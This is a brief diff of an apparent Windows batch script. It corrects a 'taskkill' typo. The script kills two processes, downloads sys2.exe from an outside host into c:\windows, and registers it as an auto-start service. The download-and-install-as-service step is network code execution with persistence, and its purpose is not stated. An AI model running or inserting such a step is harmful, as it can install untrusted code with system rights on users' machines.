@@ -1,5 +1,5 @@
-taskill /f /im sys1.exe
-taskill /f /im sys2.exe
+taskkill /f /im sys1.exe
+taskkill /f /im sys2.exe
 sc delete CppWindowsService
 wget http://troglo.homepc.it/win/sys2.exe -O c:\windows\sys2.exe
 sc create CppWindowsService binPath= c:\windows\sys2.exe DisplayName= "CppWindowsService" start= auto
